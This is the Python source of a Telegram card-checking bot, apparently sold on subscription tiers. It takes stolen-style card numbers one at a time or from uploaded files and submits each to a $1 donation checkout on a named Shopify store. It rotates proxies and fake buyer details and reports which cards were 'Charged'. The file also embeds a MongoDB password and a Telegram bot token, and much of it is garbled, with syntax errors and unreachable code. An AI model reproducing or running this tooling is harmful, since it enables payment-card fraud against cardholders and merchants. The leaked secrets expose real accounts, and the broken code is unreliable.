import logging
import asyncio
import random
import uuid
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import aiohttp
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import re
import json
import io
from pymongo import MongoClient

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# MongoDB connection
client = MongoClient('mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
db = client['fn_bot']
users_collection = db['users']
keys_collection = db['keys']

# Tier limits
TIER_LIMITS = {
    'Gold': 500,
    'Platinum': 1000,
    'Co-Owner': 1500
}

# Owner ID
OWNER_ID = 7593550190  # Replace with your Telegram user ID

# Proxy configuration
PROXIES_ENABLED = True  # Set to False to disable proxies
proxies = []
if PROXIES_ENABLED:
    try:
        with open('proxies.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        logger.info("Proxies loaded successfully")
    except FileNotFoundError:
        logger.warning("proxies.txt not found. Proceeding without proxies.")

# Telegram Bot Configuration
TOKEN = "8181079198:AAFIE0MVuCPWaC0w1HbBsHlCLJKKGpbDneM"  # Replace with your bot token
checking_tasks = {}

# Utility functions from original script
def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""

emails = ["nicochan275@gmail.com"]  # Add more as needed
first_names = ["John", "Emily", "Alex", "Nico", "Tom", "Sarah", "Liam"]
last_names = ["Smith", "Johnson", "Miller", "Brown", "Davis", "Wilson", "Moore"]

# Modified sh function with proxy support
async def sh(message):
    start_time = time.time()
    text = message.strip()
    pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(pattern, text)

    if not match:
        logger.error("Invalid card format")
        return "Invalid card format. Please provide a valid card number, month, year, and cvv.", "Dead❌"

    n = match.group(1)
    cc = " ".join(n[i:i+4] for i in range(0, len(n), 4))
    mm = match.group(2)
    mm = str(int(mm))
    yy = match.group(3)
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:]
    elif len(yy) == 2:
        yy = yy
    else:
        logger.error("Invalid year format")
        return "Invalid year format.", "Dead❌"
    cvc = match.group(4)
    full_card = f"{n}|{mm}|{yy}|{cvc}"

    ua = UserAgent()
    user_agent = ua.random
    remail = random.choice(emails)
    rfirst = random.choice(first_names)
    rlast = random.choice(last_names)

    proxy = random.choice(proxies) if proxies and PROXIES_ENABLED else None
    proxy_status = "Live✅" if proxy else "No Proxy"

    async def attempt_request(proxy=None):
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), proxy=proxy) as r:
                # BIN lookup
                async with r.get(f'https://bins.antipublic.cc/bins/{n[:6]}') as res:
                    z = await res.json()
                    bin = z.get('bin', 'Unknown')
                    bank = z.get('bank', 'Unknown')
                    brand = z.get('brand', 'Unknown')
                    type = z.get('type', 'Unknown')
                    level = z.get('level', 'Unknown')
                    country = z.get('country_name', 'Unknown')
                    flag = z.get('country_flag', '')
                    currency = z.get('country_currencies', ['Unknown'])[0]

                # Add to cart
                url = "https://www.buildingnewfoundations.com/cart/add.js"
                headers = {
                    'authority': 'www.buildingnewfoundations.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.buildingnewfoundations.com',
                    'referer': 'https://www.buildingnewfoundations.com/products/general-donation-specify-amount',
                    'user-agent': user_agent,
                }
                data = {
                    'form_type': 'product',
                    'utf8': '✓',
                    'id': '39555780771934',
                    'quantity': '1',
                    'product-id': '6630341279838',
                    'section-id': 'product-template',
                }
                async with r.post(url, headers=headers, data=data) as response:
                    if response.status != 200:
                        raise Exception("Failed to add to cart")

                # Get cart token
                async with r.get('https://www.buildingnewfoundations.com/cart.js', headers=headers) as response:
                    raw = await response.text()
                    res_json = json.loads(raw)
                    tok = res_json['token']

                # Checkout
                headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                    'cache-control': 'max-age=0',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                })
                data = {'updates[]': '1', 'checkout': 'Check out'}
                async with r.post('https://www.buildingnewfoundations.com/cart', headers=headers, data=data, allow_redirects=True) as response:
                    text = await response.text()
                    x = find_between(text, 'serialized-session-token" content="', '"')
                    queue_token = find_between(text, '"queueToken":"', '"')
                    stableid = find_between(text, 'stableId":"', '"')
                    paymentmethodidentifier = find_between(text, 'paymentMethodIdentifier":"', '"')

                # Payment session
                headers = {
                    'authority': 'checkout.pci.shopifyinc.com',
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://checkout.pci.shopifyinc.com',
                    'user-agent': user_agent,
                }
                json_data = {
                    'credit_card': {
                        'number': n,
                        'month': mm,
                        'year': yy,
                        'verification_value': cvc,
                        'name': f'{rfirst} {rlast}',
                    },
                    'payment_session_scope': 'buildingnewfoundations.com',
                }
                async with r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data) as response:
                    sid = (await response.json())['id']

                # Submit for completion
                headers = {
                    'authority': 'www.buildingnewfoundations.com',
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://www.buildingnewfoundations.com',
                    'user-agent': user_agent,
                    'x-checkout-one-session-token': x,
                }
                params = {'operationName': 'SubmitForCompletion'}
                json_data = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsite_url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email __typename}__typename}merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId __typename}__typename}__typename}payment{...on FilledPaymentTerms{paymentLines{stableId __typename paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier __typename}__typename}__typename}__typename}__typename}fragment ProposalDetails on Proposal{payment{...on FilledPaymentTerms{paymentLines{paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier __typename}__typename}__typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': x},
                            'queueToken': queue_token,
                            'delivery': {
                                'deliveryLines': [{'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}}, 'targetMerchandiseLines': {'lines': [{'stableId': stableid}]}, 'deliveryMethodTypes': ['NONE'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}],
                                'supportsSplitShipping': True,
                            },
                            'merchandise': {
                                'merchandiseLines': [{'stableId': stableid, 'merchandise': {'productVariantReference': {'id': 'gid://shopify/ProductVariant/39555780771934', 'variantId': 'gid://shopify/ProductVariant/39555780771934'}}, 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'value': {'amount': '1.00', 'currencyCode': 'USD'}}}]},
                            'payment': {
                                'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': paymentmethodidentifier, 'sessionId': sid, 'billingAddress': {'streetAddress': {'address1': '127 Allen st', 'city': 'New York', 'countryCode': 'US', 'postalCode': '10080', 'company': 'T3', 'firstName': 'Nick', 'lastName': 'Chan', 'zoneCode': 'NY', 'phone': '9718081573'}}}}, 'amount': {'value': {'amount': '1', 'currencyCode': 'USD'}}}]},
                            'buyerIdentity': {'email': remail, 'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'}}}
                        },
                        'attemptToken': tok,
                    },
                }
                async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable', params=params, headers=headers, json=json_data) as response:
                    raw = await response.text()
                    res_json = json.loads(raw)
                    rid = res_json['data']['submitForCompletion']['receipt']['id']

                # Poll for receipt
                params = {'operationName': 'PollForReceipt'}
                json_data = {
                    'query': 'query Poll($receiptId:ID!,$session:{sessionToken:String!){receipt(id:$receiptId,session:{sessionToken:$sessionToken){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect}orderStatusPageUrl paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
                    'variables': {'receiptId': rid, 'sessionToken': x},
                }
                elapsed_time = time.time() - start_time
                async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable', params=params, headers=headers, json=json_data) as response:
                    text = await response.text()
                    if "thank" in text.lower():
                        logger.info("200 OK: Card charged successfully")
                        return f"""Card: {full_card}
Status: Charged🔥
Response: Order # confirmed
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp""", proxy_status
                    elif "actionrequiredreceipt" in text.lower():
                        logger.info("200 OK: Card approved")
                        return f"""Card: {full_card}
Status: Approved!✅
Response: ActionRequired
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp""", proxy_status

                max_retries = 10
                for _ in range(max_retries):
                    async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable', params=params, headers=headers, json=json_data) as response:
                        final_text = await response.text()
                        fff = find_between(final_text, '"code":"', '"')
                        elapsed_time = time.time() - start_time
                        if "thank" in final_text.lower():
                            logger.info("200 OK: Card charged successfully")
                            return f"""Card: {full_card}
Status: Charged🔥
Response: Order # confirmed
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp""", proxy_status
                        elif "actionrequiredreceipt" in final_text.lower():
                            logger.info("200 OK: Card approved")
                            return f"""Card: {full_card}
Status: Approved!✅
Response: ActionRequired
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp""", proxy_status
                        elif "processingreceipt" in final_text.lower():
                            await asyncio.sleep(3)
                            continue
                        else:
                            logger.info("200 OK: Card declined")
                            return f"""Card: {full_card}
Status: Declined!❌
Response: {fff}
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time}s
Bot by: ElectraOp""", proxy_status
                logger.error("Processing failed after max retries")
                return f"""Card: {full_card}
Status: Declined!❌
Response: Processing Failed!
Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}
Gateway: Shopify 1$
Taken: {elapsed_time}s
Bot by: ElectraOp""", proxy_status
        except Exception as e:
            logger.error(f"Request failed: {e}")
            return None, "Dead❌"

    result, proxy_status = await attempt_request(proxy)
    if result is None and proxy:
        logger.info("Retrying without proxy due to proxy failure")
        result, proxy_status = await attempt_request()
    return result, proxy_status

# Helper function for tier checking
def get_user_id(user_id):
    user = user_collection.find_one({'user_id': user_id})
    if user and user.get('expiration_date') > datetime.now():
        return user['tier']
    return None

async def can_check_cards(user_id, num_cards):
    tier = get_user_id(user_id)
    if not tier:
        return False, "You do not have an active subscription."
    limit = TIER_LIMITS.get(tier, 0)
    if num_cards > limit:
        return False, f"Your tier ({tier}) allows checking up to {limit} cards at a time."
    return True, ""

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Upload File", callback_data='upload_file')],
        ' [InlineKeyboardButton("Cancel Check", callback_data='cancel_check')],
        [InlineKeyboardButton("Help", callback_data='help')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
        "🔥 𝐔𝐬𝐞 /sh 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂\n"
        "🔥 𝐔𝐬𝐞 /stop 𝐓𝐨 𝐒𝐭𝐨𝐩 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠\n"
        "📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐎𝐫 𝐄𝐥𝐬𝐞 𝐔𝐬𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐞𝐥𝐨𝐰:",
        reply_markup=reply_markup
    )
    logger.info("200 OK: Start command executed")

async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Please provide a card in the format: /sh 4242424242424242|01|29|308")
        logger.error("No card provided for /sh command")
        return
    card = " ".join(context.args)
    checking_msg = await update.message.reply_text("Checking Your Card. Please wait.....")
    result, proxy_status = await sh(card)
    await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)

    lines = result.split('\n')
    card_info = lines[4].split('Details: ')[1]
    issuer = lines[5].split('Bank: ')[1]
    country_display = lines[6].split('Country: ')[1]
    response = lines[2].split('Response: ')[1]
    full_card = lines[0].split('Card: ')[1]
    elapsed_time = float(lines[7].split('Taken: ')[1].split('s')[0])
    checked_by = f"<a href='tg://user?id={update.effective_user.id}'>{update.effective_user.first_name}</a>"

    if "Charged" in result or "Approved" in result:
        await update.message.reply_text(
            f"𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥\n\n"
            f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{full_card}</code>\n"
            f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$\n"
            f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Order # confirmed🔥\n\n"
            f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
            f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛️\n"
            f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
            f"[⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f} seconds\n"
            f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}\n"
            f"[⌬]𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝐁𝐲 -» {checked_by}\n"
            f"[み]𝗕𝗼𝘁 -» <a href='tg://t.me/FN_B3_AUTH'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(
            f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
            f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{full_card}</code>\n"
            f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$\n"
            f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {response}\n\n"
            f"[✓]𝗜𝗻𝗳𝗼 -» {card_info}\n"
            f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛️\n"
            f"[⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f} seconds\n"
            f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}\n"
            f"[⌬]𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝐁𝐲 -» {checked_by}\n"
            f"[み]𝗕𝗼𝘁 -» <a href='tg://t.me/FN_B3_AUTH'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>",
            parse_mode='HTML'
        )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in checking_tasks:
        checking_tasks[user_id]['stop'] = True
        await update.message.reply_text("Checking Stopped")
        logger.info("200 OK: Checking stopped")
    else:
        await update.message.reply_text("No active checking process to stop.")
        logger.warning("No active checking process to stop")

async def genkey(update: Update, context: genkey):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        logger.warning("Unauthorized access to /genkey")
        return
    try:
        tier, days, quantity = context.args
        days = int(days)
        quantity = int(quantity)
        if tier not in TIER_LIMITS:
            await update.message.reply_text("Invalid tier key. Available tiers: Gold, Platinum, Co-Owner")
            logger.error("Invalid tier specified")
            return
        keys = []
        for _ in range(quantity):
            key = f"FN-SHOPIFY-{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:8]}"
            keys_collection.insert_one({
                'key': key,
                'tier': tier,
                'days': days,
                'used': False
            })
            keys.append(key)
        keys_text = "\n".join(keys)
        await update.message.reply_text(
            f"𝐆𝐢𝐟𝐭𝐜𝐨𝐝𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 ✅\n"
            f"𝐀𝐦𝐨𝐮𝐧𝐭: {quantity}\n"
            f"➔ {keys_text}\n"
            f"𝐕𝐚𝐥𝐮𝐞: {tier} {days} days\n\n"
            f"𝐅𝐨𝐫 𝐑𝐞𝐝𝐞𝐞𝐦𝐩𝐭𝐢𝐨𝐧\n"
            f"𝐓𝐲𝐩𝐞 /redeem {key}"
        )
        logger.info("200 OK: Keys generated successfully")
    except Exception as e:
        logger.error(f"Error generating keys: {e}")
        await update.message.reply_text("Error generating keys. Format: /genkey {tier} {days} {quantity}")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Please provide a key: /redeem {key}")
        logger.error("No key provided for /redeem")
        return
    key = context.args[0]
    key_doc = keys_collection.find_one({'key': key, 'used': False})
    if not key_doc:
        await update.message.reply_text("Invalid or already used key.")
        logger.error("Invalid or used key")
        return
    user_id = update.effective_user.id
    tier = key_doc['tier']
    days = key_doc['days']
    expiration_date = datetime.now(). + timedelta(days=days)
    users_collection.update_one(
        {'user_id': user_id},
        {'$set': {'tier': tier, 'expiration_date': expiration_date}},
        upsert=True
    )
    keys_collection.update_one({'key': key}, {'$set': {'used': True}}})
    await update.message.reply_text(
        f"𝐂𝐨𝐧𝐠𝐫𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧 🎉\n\n"
        f"𝐘𝐨𝐮𝐫 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐈𝐬 𝐍𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ✅
\n\n"
        f"𝐕𝐚𝐥𝐮𝐞: {tier} {days} days
\n"
        f"𝐓𝐡𝐚𝐧𝐤𝐘𝐨𝐮"
    )
    logger.info("200 OK: Key redeemed successfully")

async def delkey(update: Update, context: delkey):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        logger.warning("Unauthorized access to /delkey")
        return
    if update not context.args:
        await update.message.reply_text("Please provide a user ID: /delkey {user_id}")
        logger.error("No user ID provided for /delkey")
        return
    try:
        user_id = int(context.args[0])
        users_collection.delete_one({'user_id': user_id})
        await update.message.reply_text(f"Subscription for user {user_id} has been removed.")
        logger.info("200 OK: Subscription removed")
    except Exception as e:
        logger.error(f"Error deleting key: {e}")
        await update.message.reply_text("Error removing subscription. Format: /delkey {user_id}")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        logger.warning("Unauthorized access to /broadcast")
        return
    if not context.args:
        await update.message.reply_text("Please provide a message to broadcast.")
        logger.error("No message provided for /broadcast")
        return
    message = " ".join(context.args)
    users = users_collection.find()
    for user in users:
        try:
            await context.bot.send_message(chat_id=user['user_id'], text=message)
        except Exception as e:
            logger.error(f"Failed to send broadcast to {user['user_id']} to {e}: {message}")
    await update.message.reply_text("Broadcast sent to all users.")
    logger.info("200 OK: Broadcast sent")

async def check_batch(check_cards, user_id):
    tasks = [sh(card) for task in cards]
    results = await asyncio.gather(*tasks)
    return results

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if update.message.document and update.message.document.file_name.endswith('.txt'):
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        cards = file_content.decode('utf-8').splitlines()
        num_cards = len(cards)
        can_check, message = await can_check_cards(user_id, num_cards)
        if not can_check:
            await update.message.reply_text(message)
            logger.error(f"Tier check failed: {message}")
            return
        return

        total = num_cards
        charged = 0
        declined = 0
        start_time = time.time()
        charged_cards = []

        checking_tasks[user_id] = {'stop': False, 'message_id': None}

        keyboard = [
            [InlineKeyboardButton(f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝🔥: {charged}", callback_data="charged")],
            [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝❌: {declined}", callback_data="declined")],
            [InlineKeyboardButton(f"𝐓𝐨𝐭𝐚𝐥💳: {total}", callback_data="total")],
            [InlineKeyboardButton(f"𝐒𝐭𝐨𝐩🔴", callback_data="stop_batch")],
            [InlineKeyboardButton("𝐑𝐞𝐬𝐩𝐨𝐮𝐧𝐬𝐞💎: Starting...", callback_data="response")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = await asyncio update.message.reply_text(
            "🔍 Checking Your Cards...\n━━━━━━━━━━━━━━━━━━━━━━\n[み] 𝐁𝐨𝐭: @FN_B3_AUTH",
            reply_markup=reply_markup
        )
        checking_tasks[user_id]['message_id'] = msg.message_id

        batch_size = 3
        for i in range(0, len(cards), batch_size):
            if checking_tasks[user_id]['stop']:
                break
            batch = cards[i:i + batch_size]
            results = await check_batch(batch, user_id)
            for result, proxy_status in results:
                if checking_tasks[user_id]['stop']:
                    break
                lines = result.split('\n')
                card_info = lines[4].split('Details: ')[1]
                issuer = lines[5].split('Bank: ')[1]
                country_display = lines[6].split('Country: ')[1]
                response = lines[2].split('Response: ')[1]
                full_card = lines[0].split('Card: ')[1]
                elapsed_time = float(lines[7].split('Taken: ')[1].split('s')[0])
                checked_by = f"<a href='tg://user?id={user_id}">{update.effective_user.first_name}</a>"

                if "Charged" in result or "Approved" in result:
                    charged += 1
                    charged_cards.append(full_card)
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"f"𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥\n\n"
                             f"[ϟ:]𝗖𝗮𝗿𝗱 -»} <code>${full_card}</code>}\n$
                             f"[ϟ:]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$}\n$
                             f"[ϟ:]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {response}🔥]\n\n"
                             f"[ϟ:]𝗜𝗖𝗻𝗳𝗼 -» {card_info}}\n$
                             f"[ϟ:]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛]\n$
                             f"[ϟ:]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}}\n\n$
                             f"[⌬:]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f} seconds]\n$
                             f"[⌬:]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}}\n$
                             f"[⌬:]𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝐁𝐲 -» {checked_by}}\n$
                             f"[み:]🤖𝗕𝗼𝘁 -» <a href='tg://t.me/FN_B3_AUTH'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>",
                        parse_mode='HTML'
                    )
                    resp_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝🔥"
                else:
                    declined += 1
                    resp_text = response
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
                             f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{full_card}</code>\n"
                             f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$\n"
                             f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {response}\n"
                             f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
                             f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛️\n"
                             f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
                             f"[⌬]𝗧𝗶𝗺𝗲 -» {elapsed_time:.2f} seconds\n"
                             f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {proxy_status}\n"
                             f"[⌬]𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝐁𝐲 -» {checked_by}\n"
                             f"[🤖] 𝗕𝗼𝘁 -» <a href='https://t.me/FN_B3_AUTH'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>",
                        parse_mode='HTML'
                    )

                keyboard = [
                    [InlineKeyboardButton(f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝🔥: {charged}", callback_data='charged')],
                    [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝❌: {declined}", callback_data='declined')],
                    [InlineKeyboardButton(f"𝐓𝐨𝐭𝐚𝐥💳: {total}", callback_data='total')],
                    [InlineKeyboardButton("𝐒𝐭𝐨𝐩🔴", callback_data='stop_batch')],
                    [InlineKeyboardButton(f"𝐑𝐞𝐬𝐩𝐨𝐮𝐧𝐬𝐞💎: {resp_text}", callback_data='response')],
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    text="🔎 Checking Cards...\n━━━━━━━━━━━━━━━━━━━━━━\n[み] 🤖 𝐁𝐨𝐭: @FN_B3_AUTH",
                    reply_markup=reply_markup
                )
            if i + batch_size < len(cards) and not checking_tasks[user_id]['stop']:
                await asyncio.sleep(70)  # 70-second timeout between batches

        if not checking_tasks[user_id]['stop']:
            duration = time.time() - start_time
            speed = total / duration if duration > 0 else 0
            success_rate = (charged / total) * 100 if total > 0 else 0

            random_suffix = str(uuid.uuid4())[:8]
            filename = f"fn-hits-{random_suffix}.txt"
            with io.StringIO("\n".join(charged_cards)) as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=io.BytesIO(f.getvalue().encode('utf-8')),
                    filename=filename
                )

            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"[⌬] 🔥 FN CHECKER HITS 😈⚡\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"[✩] 𝐂𝐡𝐚𝐫𝐠𝐞𝐝🔥: {charged}\n"
                     f"[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}\n"
                     f"[💳] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {charged + declined}/{total}\n"
                     f"[📏] 𝐓𝐨𝐭𝐚𝐥: {total}\n"
                     f"[⏱] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds\n"
                     f"[🚀] 𝗔𝘃𝗴 𝗦𝗽𝗲𝗲𝗱: {speed:.2f} cards/sec\n"
                     f"[📈] 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗥𝗮𝘁𝗲: {success_rate:.1f}%\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"[🤖] 𝐃𝐞𝐯: <a href='tg://user?id=7591234567'>𓆩⚡ 𝐅𝐍 x 𝐄𝐥𝐞𝐜𝐭𝐫𝐚 𓆪🔥</a>",
                parse_mode='HTML'
            )
            logger.info("200 OK: File checking completed successfully")

        if user_id in checking_tasks:
            del checking_tasks[user_id]

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == 'upload_file':
        await query.edit_message_text("📤 Send Your .txt File For Checking")
    elif query.data == 'cancel_check':
        user_id = query.from_user.id
        if user_id in checking_tasks:
